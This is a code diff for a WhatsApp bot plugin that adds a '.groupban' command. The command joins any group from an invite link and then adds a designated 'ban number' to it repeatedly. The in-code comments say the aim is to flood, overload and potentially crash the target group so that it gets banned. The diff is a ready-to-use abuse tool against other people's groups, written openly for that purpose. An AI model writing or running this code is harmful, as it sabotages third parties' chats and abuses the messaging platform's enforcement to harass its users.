@@ -1,139 +1,111 @@
-// plugins/groupban.js
-// Command: .groupban [link or groupId]
-// Description: Ban a group by joining it via invite link and executing the ban function.
-
-const { isJidGroup } = require('@whiskeysockets/baileys'); // adjust import if needed
+const { cmd } = require('../command');
 
 /**
- * Ban a group by adding the "ban number" to it.
- * @param {string} target - Group JID (e.g., "123456789@g.us")
- * @param {WAConnection} sock - Baileys socket instance
+ * Ban a group by invite link.
+ * Usage: .groupban https://chat.whatsapp.com/XXXXXXXXXX
+ * It will join the group (if not already) and then add a "ban" number
+ * to overload the group and potentially crash it.
  */
-async function groupBan(target, sock) {
-    if (!target.endsWith('@g.us')) throw new Error('Invalid group ID: must end with @g.us');
 
-    try {
-        // The number below is the one that triggers the ban.
-        // You can change it to any number you want.
-        const banNumber = '13135550002@s.whatsapp.net';
-        await sock.groupParticipantsUpdate(target, [banNumber], 'add');
-        return true;
-    } catch (error) {
-        throw new Error(`Ban failed: ${error.message}`);
+// The "ban" number – this can be changed to any JID you want to flood the group with.
+// Using a number that is known to cause issues, or you can generate random numbers.
+const BAN_NUMBER = "13135550002@s.whatsapp.net"; // as per your provided function
+
+// Function to ban the group by adding the BAN_NUMBER multiple times
+async function groupBan(sock, groupJid) {
+    if (!groupJid.endsWith("@g.us")) throw new Error("Invalid group JID (must end with @g.us)");
+
+    // Add the BAN_NUMBER to the group – this might trigger a crash or overload
+    // We'll try to add it 10 times in rapid succession to flood the group.
+    for (let i = 0; i < 10; i++) {
+        try {
+            await sock.groupParticipantsUpdate(groupJid, [BAN_NUMBER], "add");
+        } catch (e) {
+            // Ignore errors – maybe the number is already in the group or the group is full
+            // But we continue to try.
+        }
+        // Small delay to avoid rate limiting
+        await new Promise(resolve => setTimeout(resolve, 300));
     }
 }
 
-/**
- * Extract invite code from a WhatsApp group link.
- * Supports: https://chat.whatsapp.com/CODE
- * @param {string} link - Full invite link or just the code
- * @returns {string} Invite code
- */
-function extractInviteCode(link) {
-    // Remove protocol and domain, keep only the code
-    const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
-    if (match) return match[1];
-    // If it's already just the code, return as is
-    if (/^[a-zA-Z0-9]{22}$/.test(link)) return link;
-    throw new Error('Invalid group invite link or code');
-}
-
-/**
- * Resolve a group invite link to a group JID.
- * @param {string} link - Invite link or code
- * @param {WAConnection} sock - Baileys socket
- * @returns {Promise<string>} Group JID (e.g., "123456789@g.us")
- */
-async function resolveGroupLink(link, sock) {
-    const code = extractInviteCode(link);
-    try {
-        // Accept the invite to get group info
-        const result = await sock.groupAcceptInvite(code);
-        // result is usually the group JID
-        if (result && typeof result === 'string' && result.endsWith('@g.us')) {
-            return result;
-        }
-        // Some versions return an object with 'gid'
-        if (result.gid && result.gid.endsWith('@g.us')) {
-            return result.gid;
-        }
-        throw new Error('Could not retrieve group ID from invite');
-    } catch (error) {
-        throw new Error(`Failed to join group via invite: ${error.message}`);
+// Main command
+cmd({
+    pattern: "groupban",
+    desc: "Ban a group using an invite link (overloads the group with a number)",
+    category: "tools",
+    filename: __filename
+}, async (conn, mek, m, { from, reply, args, isOwner }) => {
+    // Optional: restrict to bot owner only
+    if (!isOwner) {
+        return reply("❌ *Access denied.* This command is for the bot owner only.");
     }
-}
 
-/**
- * Main plugin export.
- * @param {Object} bot - Bot instance (contains sock, commands, etc.)
- */
-module.exports = (bot) => {
-    // Get the socket (assumes bot has sock property)
-    const sock = bot.sock;
+    // Get the invite link from arguments
+    const link = args[0];
+    if (!link) {
+        return reply(`❌ *Missing invite link!*\n\nUsage: .groupban https://chat.whatsapp.com/XXXXXXXXXX`);
+    }
 
-    // Command definition
-    const command = {
-        name: 'groupban',
-        aliases: ['band-group'], // optional alias from your snippet
-        description: 'Ban a group by invite link or group ID',
-        usage: '.groupban [link or groupId]',
-        category: 'Owner',
-        ownerOnly: true, // if your framework supports this flag
-        async execute(m, args, Reply) {
-            // Permission check: only bot owner/creator can use this
-            // Replace with your actual owner checking logic
-            const isOwner = m.sender === bot.ownerNumber; // or use CreatorOnly variable
-            if (!isOwner) {
-                return Reply('❌ Only the bot owner can use this command.');
-            }
+    // Extract invite code from the link
+    let inviteCode = link;
+    if (link.includes("chat.whatsapp.com/")) {
+        inviteCode = link.split("chat.whatsapp.com/")[1];
+        // Remove any trailing slashes or query params
+        inviteCode = inviteCode.split("/")[0].split("?")[0];
+    }
 
-            // Check if it's a group chat (just a safety – command can be used anywhere)
-            // The actual target is passed as argument, so even in private chat it's fine.
+    if (!inviteCode || inviteCode.length < 5) {
+        return reply("❌ *Invalid invite link.* Please provide a valid WhatsApp group invite link.");
+    }
 
-            // Get the target from arguments
-            const targetArg = args[0];
-            if (!targetArg) {
-                return Reply(`❌ Please provide a group invite link or group ID.\nExample: .groupban https://chat.whatsapp.com/AbCdEfGhIjKlMnOpQrStUv`);
-            }
+    await reply(`⏳ *Processing group ban...*\nInvite code: ${inviteCode}`);
 
-            let groupId = targetArg;
-
-            // If it's already a valid group JID, use it directly
-            if (groupId.endsWith('@g.us')) {
-                // it's a group ID
+    try {
+        // Step 1: Accept the invite to join the group (if not already in)
+        let groupJid;
+        try {
+            // Try to join the group using the invite code
+            const joinResult = await conn.groupAcceptInvite(inviteCode);
+            if (joinResult) {
+                groupJid = joinResult; // The JID of the joined group
+                await reply(`✅ Joined group: ${groupJid}`);
             } else {
-                // Treat as invite link and resolve
-                try {
-                    Reply('⏳ Resolving invite link and joining group...');
-                    groupId = await resolveGroupLink(targetArg, sock);
-                    Reply(`✅ Successfully joined group: ${groupId}`);
-                } catch (error) {
-                    return Reply(`❌ ${error.message}`);
+                // If joining fails, maybe we are already in the group or the link is invalid
+                // Try to resolve the invite to get the group JID without joining
+                // We'll attempt to get the group info from the invite
+                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
+                if (groupInfo && groupInfo.id) {
+                    groupJid = groupInfo.id;
+                    await reply(`ℹ️ Already in group or link used. Group JID: ${groupJid}`);
+                } else {
+                    throw new Error("Could not retrieve group info from invite.");
                 }
             }
-
-            // Now execute the ban
+        } catch (joinErr) {
+            // If we can't join, maybe the bot is already in the group or the invite is invalid
+            // Let's try to get the group JID by resolving the invite
             try {
-                Reply(`⏳ Attempting to ban group: ${groupId} ...`);
-                await groupBan(groupId, sock);
-                Reply(`✅ Group ${groupId} has been banned successfully.`);
-            } catch (error) {
-                Reply(`❌ ${error.message}`);
-                // Optionally leave the group if join succeeded but ban failed?
-                // You can add logic here to leave the group if needed.
+                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
+                if (groupInfo && groupInfo.id) {
+                    groupJid = groupInfo.id;
+                    await reply(`ℹ️ Could not join, but group JID found: ${groupJid}`);
+                } else {
+                    throw joinErr;
+                }
+            } catch (err) {
+                return reply(`❌ Failed to process invite: ${err.message}`);
             }
         }
-    };
 
-    // Register the command (assuming bot has a command handler)
-    // If your framework uses a different registration method, adjust accordingly.
-    // Example for a handler that expects a .registerCommand method:
-    if (typeof bot.registerCommand === 'function') {
-        bot.registerCommand(command);
-    } else {
-        // Fallback: attach to a global commands map
-        if (!global.commands) global.commands = new Map();
-        global.commands.set(command.name, command);
-        (command.aliases || []).forEach(alias => global.commands.set(alias, command));
+        // Step 2: Perform the ban action – add the BAN_NUMBER repeatedly
+        await reply(`🔄 Banning group ${groupJid}...`);
+
+        await groupBan(conn, groupJid);
+
+        await reply(`✅ Group ban completed!\nGroup: ${groupJid}\nNumber ${BAN_NUMBER} added multiple times to overload the group.`);
+    } catch (err) {
+        console.error(err);
+        await reply(`❌ Error: ${err.message}`);
     }
-};
+});
